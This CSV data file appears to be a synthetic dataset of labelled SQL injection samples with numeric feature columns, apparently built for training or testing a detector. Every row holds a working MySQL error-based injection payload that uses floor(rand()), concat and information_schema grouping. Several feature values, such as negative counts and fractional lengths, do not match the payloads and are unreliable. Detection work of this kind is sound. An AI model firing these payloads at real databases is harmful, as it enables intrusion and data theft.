id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000703,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.604303586216398,280.0416564941406,102.581298828125,41.1060905456543,109.00750732421875,-11.867731094360352,98.9628677368164,40.55433654785156,1.3781366348266602,0.35715046525001526,0.10091590881347656,0.36595672369003296,0.125682532787323,3.9961414337158203,1.7561867237091064,1.4913440942764282,-0.07817655801773071,0.36843571066856384,-0.031704388558864594,-0.37074142694473267,13.071700096130371,12.882345199584961,2.7713215351104736,0.42757925391197205,1.6572095155715942,0.31211063265800476,-0.537410318851471,0.02851177379488945,0.24156078696250916,1.6783194541931152,0.14687639474868774,0.1956028938293457,0.6792182326316833,-0.09995532035827637,0.4178052544593811,1.676506757736206,5.964144706726074,0.9954891800880432,3.8454699516296387,1.0242035388946533,-0.1247323527932167,0.8862434029579163,-0.24974995851516724,0.09815037250518799,-0.3334341049194336,-0.052990153431892395,-0.9470056891441345,0.15831251442432404,0.15780843794345856,0.1695983111858368,0.0919269248843193,0.8739107847213745,0.3559843897819519,-0.6103147864341736,0.47087737917900085,0.21082153916358948,0.18099011480808258,-0.04457264766097069,-0.25722265243530273,-0.046153631061315536,-0.1370423436164856,-0.06084691733121872,-0.7463952302932739,-0.9890522956848145,0.026210090145468712,-0.5495431423187256,0.6347406506538391,-1.1813585758209229,-0.2766830325126648,0.9521133899688721,-0.6171289682388306,0.14230313897132874,0.4869931936264038,-0.41002190113067627,-0.2863009572029114,-0.1533699929714203,1.3082735538482666,0.2315337061882019,-0.22675259411334991,0.022341065108776093,0.5774168968200684,11.398695945739746,1.1290408372879028,0.4528083801269531,0.022596532478928566,1.0234177112579346,-0.7026972770690918,1.0264170169830322,0.8399970531463623
GAN_000704,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.644328249956761,287.99261474609375,94.45337677001953,39.96363067626953,116.832763671875,-9.24815559387207,76.20021057128906,40.781883239746094,1.5863300561904907,0.33620235323905945,0.11115464568138123,0.3599480390548706,0.14060893654823303,3.9997403621673584,1.254189372062683,1.0229346752166748,-0.053981661796569824,0.4098365008831024,0.1867387741804123,-0.5124022364616394,11.374173164367676,12.178081512451172,1.5813053846359253,0.3360932767391205,1.6829732656478882,0.2038392722606659,-0.16665971279144287,-0.08422722667455673,0.14523792266845703,1.1372517347335815,0.41304370760917664,0.16338250041007996,1.0784833431243896,-0.1046755313873291,0.4501534104347229,1.621094822883606,6.053700923919678,0.8400541543960571,3.683505058288574,1.1683025360107422,-0.24938426911830902,0.6884225606918335,-0.2731242775917053,0.0722426176071167,-0.26993438601493835,-0.04109952598810196,-1.1307716369628906,0.3089275062084198,0.18882791697978973,0.21948246657848358,0.24281778931617737,0.8497753143310547,0.4652932584285736,-0.41679251194000244,0.4041464030742645,0.13472162187099457,0.22563965618610382,-0.09629134833812714,-0.4526715874671936,-0.24976827204227448,0.01653546467423439,0.13243409991264343,-0.3262743353843689,-0.8584993481636047,0.012353301048278809,-0.4549427628517151,0.5877841114997864,-1.0456606149673462,-0.5132956504821777,0.5990380644798279,-0.6798844933509827,0.3676148056983948,0.15084919333457947,-0.5773712992668152,-0.11095935106277466,-0.17841839790344238,1.3237957954406738,0.3410937488079071,-0.5173575282096863,0.022131502628326416,0.635971188545227,11.399449348449707,1.1261860132217407,0.4445750117301941,-0.020856639370322227,0.856023907661438,-0.47759342193603516,0.7260683178901672,0.47141098976135254
GAN_000705,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.735593221498418,275.31719970703125,104.96571350097656,41.52733612060547,107.67784118652344,-22.036869049072266,98.72457122802734,40.153621673583984,1.4635028839111328,0.3457595407962799,0.08930155634880066,0.36997106671333313,0.13673117756843567,4.031141757965088,1.115410327911377,1.132668137550354,0.2880316376686096,0.31422919034957886,0.4591233730316162,-0.433531790971756,13.369521141052246,12.612804412841797,1.3765605688095093,0.3484322130680084,1.8336611986160278,0.19115059077739716,-0.5264186263084412,-0.20151524245738983,0.2758362293243408,1.3217880725860596,0.6600809097290039,-0.2322503924369812,1.366125464439392,-0.17464427649974823,0.42998358607292175,1.290269374847412,5.830394268035889,1.0906046628952026,3.586275100708008,2.01434588432312,-0.7006001472473145,1.1447768211364746,-0.7118374705314636,0.10455424338579178,-0.25608113408088684,0.27147427201271057,-1.5793347358703613,0.17143948376178741,0.06515722721815109,0.07921808212995529,-0.014700329862535,1.0384637117385864,0.7717412114143372,-0.7504921555519104,0.36226579546928406,0.1400887370109558,0.20649079978466034,0.2564549446105957,-1.0931401252746582,-0.1040404886007309,0.020147785544395447,-0.14061006903648376,-0.13982181251049042,-1.5764691829681396,-0.05078201740980148,-0.8287951350212097,0.5933152437210083,-1.522435188293457,-0.6046551465988159,1.0733935832977295,-0.7147150635719299,0.27579978108406067,0.3352198898792267,-0.922694206237793,-0.07712595164775848,0.24490785598754883,1.9316565990447998,0.3721277415752411,-0.29142698645591736,0.1230112686753273,0.6766930222511292,11.491861343383789,1.425050139427185,0.4981016218662262,-0.03523732349276543,0.8073166012763977,-0.4791250228881836,1.4887603521347046,0.664997935295105
GAN_000706,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,5.4561876908321025,287.5447998046875,96.50538635253906,40.70912551879883,103.99028778076172,-7.123110771179199,91.03546142578125,37.257320404052734,1.269187092781067,0.347865492105484,0.1260090172290802,0.37178075313568115,0.13222384452819824,4.011468410491943,1.8170154094696045,0.7690793871879578,0.09428024291992188,0.1997833102941513,0.02858201414346695,-0.17663714289665222,11.204719543457031,10.40836238861084,3.2983884811401367,0.061459772288799286,1.8847038745880127,0.14807899296283722,-0.30268576741218567,-0.02748716250061989,0.1597619354724884,1.232696533203125,0.18911799788475037,0.1488654613494873,1.3244280815124512,-0.0655895471572876,0.3099869191646576,1.7812621593475342,6.229511737823486,0.868175208568573,2.9930834770202637,0.9493132829666138,0.04926370829343796,1.0189437866210938,-0.36738595366477966,0.06359873712062836,-0.08288273215293884,0.040992431342601776,-0.6203611493110657,0.24987319111824036,0.1498989462852478,0.25240278244018555,0.22156159579753876,0.588831901550293,0.2932344079017639,-0.17584699392318726,0.4772413969039917,0.17071324586868286,0.16206809878349304,-0.12017637491226196,-0.015206515789031982,-0.03187509998679161,-0.1525854766368866,-0.04949112981557846,-0.3474772870540619,-0.6447011232376099,0.01430794782936573,-0.328948974609375,0.6787759065628052,-0.5478276014328003,-0.10201595723628998,0.5577470064163208,-0.3421823978424072,-0.0025792010128498077,0.09559939801692963,-0.4805619716644287,-0.23099380731582642,-0.08288693428039551,1.1134967803955078,0.40945911407470703,-0.1351715326309204,0.03151755779981613,0.4773164391517639,10.58277416229248,1.1057847738265991,0.2995166480541229,0.01934114284813404,0.8324492573738098,-0.38027170300483704,0.535102903842926,0.3940114378929138
GAN_000707,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.085693650397811,287.07598876953125,104.63543701171875,41.10112762451172,120.40840911865234,-13.074199676513672,88.86415100097656,42.662681579589844,1.555100679397583,0.3359662890434265,0.10274199396371841,0.36542993783950806,0.1422027051448822,4.043076515197754,1.282583236694336,1.0813096761703491,0.13713350892066956,0.36620649695396423,0.09030424058437347,-0.5742114186286926,13.290630340576172,12.818464279174805,1.2721689939498901,0.24599707126617432,1.7096136808395386,0.13181856274604797,-0.36132562160491943,-0.04776391759514809,0.11548267304897308,1.0891034603118896,0.5427240133285522,-0.29613566398620605,0.8941587805747986,-0.015670698136091232,0.44391536712646484,1.4105889797210693,6.3208184242248535,0.9974710941314697,3.533721446990967,1.5392273664474487,-0.4462001621723175,0.9121624231338501,-0.5000771284103394,0.06831059604883194,-0.02143237181007862,0.09986615926027298,-1.3895455598831177,0.33424800634384155,0.09680428355932236,0.1643633246421814,0.07486560195684433,0.9671797156333923,0.6092202663421631,-0.6451293230056763,0.46613046526908875,0.07291775196790695,0.251954048871994,0.3323940336704254,-0.8117531538009644,-0.19383524358272552,0.24932661652565002,-0.2316705584526062,-0.40742385387420654,-0.9384686946868896,-0.013735623098909855,-0.6965453028678894,0.6636368632316589,-1.450415849685669,-0.44489070773124695,1.0615378618240356,-0.6635516285896301,0.48773765563964844,0.29647666215896606,-0.701026439666748,-0.011389270424842834,0.2112135887145996,1.5044207572937012,0.40448111295700073,-0.4448947012424469,0.003620989853516221,0.618860125541687,11.896031379699707,1.2052857875823975,0.5069167613983154,-0.035334616899490356,0.7602247595787048,-0.2600092887878418,1.1547526121139526,0.45757269859313965
GAN_000708,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.1572494429294204,290.902099609375,107.52324676513672,37.215232849121094,113.70076751708984,-19.194171905517578,92.6294174194336,36.264461517333984,1.6832962036132812,0.35469603538513184,0.09418481588363647,0.3560306131839752,0.14276616275310516,4.090510845184326,0.984872579574585,0.6335529088973999,0.06344026327133179,0.21521446108818054,0.5533012747764587,-0.21799308061599731,12.267120361328125,10.732867240905762,1.6554065942764282,0.32210293412208557,1.9407446384429932,0.03420233353972435,-0.4723309278488159,-0.31351351737976074,0.21299085021018982,1.3374104499816895,0.6458105444908142,0.08130606263875961,1.425986409187317,-0.14154766499996185,0.3082239329814911,1.3413983583450317,5.223903179168701,0.733600378036499,3.0869030952453613,1.6133900880813599,-0.6084029674530029,1.2775583267211914,-0.7420684099197388,0.12048915773630142,-0.2655218839645386,0.3253108859062195,-1.6480693817138672,0.16678600013256073,0.08576037734746933,0.019513273611664772,0.13172647356987,0.8365269899368286,0.9162789583206177,-0.29955172538757324,0.26724347472190857,0.046645425260066986,0.2072359323501587,-0.25102758407592773,-0.6864365339279175,-0.25778210163116455,0.08499149233102798,-0.20922020077705383,-0.04698951169848442,-1.375269889831543,-0.006611566059291363,-0.7881964445114136,0.686463475227356,-1.0524237155914307,-0.4354194402694702,1.0472463369369507,-0.6521071195602417,0.0660918727517128,0.011523090302944183,-0.6692453622817993,-0.2101115584373474,0.04441840201616287,1.8037108182907104,0.5923976302146912,-0.37081462144851685,0.05810795724391937,0.6050089001655579,11.999349594116211,1.5319559574127197,0.39165329933166504,-0.05398329347372055,0.8002631068229675,-0.4213423430919647,1.2599834203720093,0.33231496810913086
GAN_000709,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.410793695219445,279.2983703613281,95.83412170410156,42.34251022338867,118.07666778564453,-11.075540542602539,79.58528900146484,38.789913177490234,1.4234333038330078,0.3282668888568878,0.11640847474336624,0.3678738474845886,0.14659669995307922,3.9995923042297363,1.2402080297470093,1.217551350593567,0.011396408081054688,0.31552472710609436,0.2866835594177246,-0.5562560558319092,11.970878601074219,10.818799018859863,2.0983240604400635,0.36073991656303406,1.8069804906845093,0.019213493913412094,-0.06018543988466263,-0.10707556456327438,0.1460663378238678,1.2062475681304932,0.37982282042503357,0.10465610772371292,1.277030110359192,-0.24133312702178955,0.3542284369468689,1.7610185146331787,6.237084865570068,0.8663352131843567,3.438786745071411,1.1551941633224487,-0.2228328436613083,0.9036213755607605,-0.41349563002586365,0.05550883337855339,-0.05305278301239014,-0.04795385152101517,-1.1121472120285034,0.386288583278656,0.18653073906898499,0.31605690717697144,0.10042514652013779,0.7965276837348938,0.451791912317276,-0.11229534447193146,0.341365247964859,0.09612098336219788,0.15700246393680573,0.08733135461807251,-0.4584733843803406,-0.1862601935863495,0.2644769847393036,-0.03543206304311752,-0.2826444208621979,-0.5367146134376526,0.019926907494664192,-0.4374910593032837,0.5804231762886047,-0.9689081907272339,-0.4542008340358734,0.6008216142654419,-0.41282230615615845,0.31983357667922974,-0.00028605200350284576,-0.40954864025115967,-0.2201453149318695,-0.06200897693634033,1.3739285469055176,0.5895190238952637,-0.3770276606082916,0.0338079109787941,0.4722157418727875,10.491564750671387,1.2691112756729126,0.377607524394989,-0.03612671047449112,0.7206597924232483,-0.3166351020336151,0.6598761677742004,0.3552800714969635
GAN_000710,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.817057822988181,274.3945617675781,95.9670181274414,42.344322204589844,102.86351013183594,-6.995749473571777,82.7483901977539,37.815025329589844,1.4141089916229248,0.3319244980812073,0.1358339488506317,0.38691094517707825,0.14032621681690216,3.9395577907562256,0.8806230425834656,0.5919196605682373,0.45701077580451965,0.2624932527542114,0.08666041493415833,-0.23267918825149536,10.574945449829102,10.310667991638184,2.609729051589966,0.29511281847953796,1.920215129852295,0.20526382327079773,-0.15622642636299133,-0.1015758141875267,0.11727654188871384,0.8869807720184326,0.46184176206588745,-0.0758424773812294,1.545081615447998,-0.49228596687316895,0.28205040097236633,1.7594386339187622,6.522789478302002,1.05184006690979,3.036364793777466,0.966015100479126,-0.06557927280664444,1.035251498222351,-0.4797004163265228,0.07679776102304459,-0.00039790570735931396,0.12004045397043228,-0.5406047105789185,0.2791970670223236,0.14434954524040222,0.2688046097755432,0.1161167249083519,0.6261569261550903,0.4747961163520813,0.10725688189268112,0.4716237485408783,0.11858846992254257,0.09840904176235199,0.18477225303649902,-0.5595430135726929,-0.08826342225074768,0.01647905632853508,-0.03051372617483139,-0.03879477083683014,-0.7363054156303406,-0.006077690981328487,-0.352053165435791,0.658420741558075,-0.4655689299106598,-0.1292080283164978,0.005470428615808487,-0.2334011048078537,0.050562456250190735,0.10293422639369965,-0.4935048818588257,-0.13166536390781403,0.37934353947639465,1.4142802953720093,0.5357556939125061,-0.20463161170482635,0.07115421444177628,0.4351288080215454,10.179508209228516,1.222442388534546,0.32175642251968384,0.03612789511680603,0.7707821130752563,-0.29971760511398315,0.7635648250579834,0.0537073016166687
GAN_000711,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,6.236705390122706,277.4721984863281,99.05187225341797,40.10829162597656,100.28793334960938,-15.516647338867188,89.2601318359375,36.9036979675293,1.2949285507202148,0.343007892370224,0.11643204092979431,0.36643803119659424,0.14145688712596893,4.085625648498535,0.987128734588623,1.2066254615783691,0.0746392011642456,0.26591289043426514,0.2907882034778595,-0.5207188725471497,11.348785400390625,10.504487037658691,2.7033607959747314,0.1897633969783783,1.7774665355682373,0.2091393917798996,-0.24263137578964233,-0.2804628014564514,0.23319673538208008,1.2287849187850952,0.31239622831344604,0.11584710329771042,1.345533847808838,-0.3126926124095917,0.28223294019699097,1.6473400592803955,6.210310459136963,0.9354860186576843,3.38175630569458,1.0951493978500366,-0.23622046411037445,1.1541978120803833,-0.4923873841762543,0.11316749453544617,-0.18657498061656952,0.1550203114748001,-0.8884833455085754,0.22472068667411804,0.04104342311620712,0.18995845317840576,-0.02890232764184475,0.698009729385376,0.49090564250946045,-0.2518513798713684,0.4657314121723175,0.18580785393714905,0.13638584315776825,-0.15983819961547852,-0.492207407951355,-0.045307956635951996,-0.1348298192024231,-0.05813685804605484,-0.2887916564941406,-0.8775970935821533,0.005721588619053364,-0.24047066271305084,0.6720979809761047,-0.8082990646362305,-0.24708810448646545,0.4701097011566162,-0.2808464765548706,-0.24540546536445618,-0.08360731601715088,-0.512169361114502,-0.4069134294986725,-0.10378094017505646,1.488249659538269,0.5112997889518738,-0.34141823649406433,0.06783006340265274,0.3403761386871338,10.683089256286621,1.415629267692566,0.3633802533149719,0.003747086739167571,0.8597739934921265,-0.3206874430179596,0.8446356654167175,0.44378426671028137
GAN_000712,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.582222597501037,286.3211975097656,101.7997817993164,37.97950744628906,115.20743560791016,-11.043924331665039,85.27978515625,38.14509582519531,1.3239203691482544,0.334435373544693,0.11906205117702484,0.3636932075023651,0.14854897558689117,4.0721435546875,1.1282846927642822,1.1240595579147339,0.07680454850196838,0.3541586101055145,0.2915306091308594,-0.271342396736145,11.89842414855957,10.94792366027832,2.0169804096221924,0.43131494522094727,1.7601603269577026,0.052756648510694504,-0.17552700638771057,-0.22030465304851532,0.11422689259052277,1.057268500328064,0.37247416377067566,-0.03662031143903732,1.221914291381836,-0.2607368528842926,0.3803645074367523,1.5189592838287354,6.085509777069092,0.9293575286865234,3.280459403991699,1.4874629974365234,-0.44543811678886414,0.8570160865783691,-0.46770864725112915,0.0632360428571701,-0.3054538369178772,-0.16429388523101807,-1.0848405361175537,0.2777751684188843,0.11822863668203354,0.09068938344717026,0.09384142607450485,0.7862052917480469,0.5772852301597595,-0.348567396402359,0.3466671407222748,0.08669266849756241,0.292354553937912,0.2052975445985794,-0.8114810585975647,-0.06899309158325195,0.029385007917881012,-0.3697980046272278,-0.227787047624588,-0.8540356755256653,0.011583531275391579,-0.42447489500045776,0.7710028290748596,-0.9177225828170776,-0.3177880644798279,0.9258942008018494,-0.5493584871292114,0.4618997275829315,-0.003776116296648979,-0.4663776159286499,-0.2849107086658478,0.10775241255760193,1.3604804277420044,0.5765368938446045,-0.5488303899765015,-0.03170344978570938,0.4569661319255829,11.99475383758545,1.3315883874893188,0.4196776747703552,-0.036407966166734695,0.7812911868095398,-0.24634423851966858,0.8902254104614258,0.20298537611961365
GAN_000713,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.296919372912159,279.5464782714844,98.87061309814453,40.36194610595703,105.97045135498047,-13.692174911499023,82.12786102294922,39.99580001831055,1.3237038850784302,0.3350736200809479,0.1058962270617485,0.3721615672111511,0.1346500813961029,3.978456735610962,1.3223119974136353,0.963823139667511,0.10820645093917847,0.26576682925224304,0.17230862379074097,-0.4336826205253601,11.486791610717773,11.136512756347656,1.8622570037841797,0.23682262003421783,1.745841145515442,0.2059781849384308,-0.24665406346321106,-0.08125393837690353,0.16900967061519623,1.1913896799087524,0.40574491024017334,-0.0036889612674713135,1.365229845046997,-0.10198412835597992,0.3239176869392395,1.77768075466156,5.786198139190674,0.6638140678405762,3.366962194442749,1.0910998582839966,-0.28122058510780334,0.9737176895141602,-0.3533311188220978,0.06999333202838898,-0.07771393656730652,0.20110712945461273,-1.00620436668396,0.3430308401584625,0.14233332872390747,0.25703200697898865,0.1484459638595581,0.7423548102378845,0.36719709634780884,-0.27052173018455505,0.43921011686325073,0.19441105425357819,0.12731193006038666,0.13641658425331116,-0.34032881259918213,-0.14524734020233154,0.07162138819694519,0.10281261056661606,-0.13942968845367432,-0.9214251041412354,-0.009294656105339527,-0.4662953019142151,0.48430657386779785,-1.096774697303772,-0.41893529891967773,0.5155431628227234,-0.3639719486236572,0.016912512481212616,0.0583045668900013,-0.5896621942520142,-0.08640708029270172,0.0585455596446991,1.48542320728302,0.4261592626571655,-0.2166307419538498,0.030665405094623566,0.48370251059532166,10.212532997131348,1.177669882774353,0.41173115372657776,0.009425120428204536,0.7772418260574341,-0.5840915441513062,0.8070175051689148,0.4945492744445801
GAN_000714,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.235326525513292,285.0803527832031,112.4964828491211,39.666717529296875,98.56413269042969,-15.089139938354492,98.29452514648438,39.697208404541016,1.751664161682129,0.36351314187049866,0.11580046266317368,0.37681645154953003,0.1383579671382904,3.9536213874816895,1.0959606170654297,0.9113988876342773,0.20041704177856445,0.08440597355365753,0.23314611613750458,-0.18506142497062683,12.164660453796387,11.248980522155762,2.535094976425171,0.21439425647258759,1.7431806325912476,0.22422578930854797,-0.16621538996696472,0.0637972354888916,0.17250292003154755,1.4795209169387817,0.5905582308769226,0.16665318608283997,1.324642539024353,-0.1607687920331955,0.21493801474571228,1.6156260967254639,6.593685626983643,0.8543647527694702,3.1802127361297607,0.6575997471809387,-0.15840594470500946,1.25156831741333,-0.41261911392211914,0.13192874193191528,-0.19255448877811432,0.26944613456726074,-1.001963496208191,0.3367006480693817,0.11336009949445724,0.26875442266464233,0.11213784664869308,0.7496137619018555,0.18462607264518738,-0.19034729897975922,0.45428943634033203,0.22991925477981567,0.04215935617685318,0.15773943066596985,-0.71339350938797,-0.13591453433036804,0.3336890637874603,-0.32445624470710754,-0.3968300521373749,-0.9753766059875488,-0.005243406631052494,-0.4702762961387634,0.6182748079299927,-0.9325375556945801,0.06547118723392487,0.6677773594856262,-0.28953418135643005,-0.4139368236064911,0.3274657428264618,-0.2744615375995636,-0.32073739171028137,-0.0001504942774772644,1.5361384153366089,0.4281146824359894,-0.23048479855060577,0.051244668662548065,0.4277038276195526,10.90298080444336,1.2866237163543701,0.39065873622894287,0.04950349032878876,0.7868712544441223,-0.7610219717025757,1.0725260972976685,0.11807055026292801
GAN_000715,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.8948550220002645,283.35369873046875,99.61046600341797,41.50992202758789,111.45176696777344,-12.160543441772461,94.85786437988281,38.05021667480469,1.3615546226501465,0.35628196597099304,0.1097743809223175,0.3731212913990021,0.12747101485729218,4.0027852058410645,1.3777132034301758,0.8363468647003174,0.2315196394920349,0.26004984974861145,0.2107655107975006,-0.21425801515579224,12.207972526550293,11.625116348266602,2.7719714641571045,0.203618124127388,1.8611780405044556,0.1862422674894333,-0.3593006432056427,-0.02172732725739479,0.1990993618965149,1.3540905714035034,0.34722936153411865,-0.011997975409030914,1.3154749870300293,-0.03887702897191048,0.3925275206565857,1.6273574829101562,6.221970081329346,1.0742555856704712,3.3639442920684814,1.1003615856170654,-0.08174676448106766,1.083797574043274,-0.38295409083366394,0.07038097828626633,-0.02188301458954811,0.2550879120826721,-0.9486725926399231,0.18395599722862244,0.10382681339979172,0.33299317955970764,0.17618414759635925,0.7463093400001526,0.42705467343330383,-0.22171881794929504,0.4914070665836334,0.14839322865009308,0.15811726450920105,-0.24315543472766876,-0.3786947727203369,-0.2986585199832916,0.007164262235164642,0.0348612479865551,-0.17399299144744873,-0.8500446081161499,0.001575838658027351,-0.4592238664627075,0.6421802639961243,-0.8065390586853027,-0.14764200150966644,0.5509833693504333,-0.5948902368545532,0.04950336366891861,0.36501532793045044,-0.5243307948112488,-0.16920092701911926,0.055050477385520935,1.5032387971878052,0.30558764934539795,-0.15763990581035614,0.027352765202522278,0.5692651271820068,11.033210754394531,1.2268675565719604,0.43696388602256775,0.019681476056575775,0.8189207911491394,-0.37265732884407043,1.0783601999282837,0.693370521068573
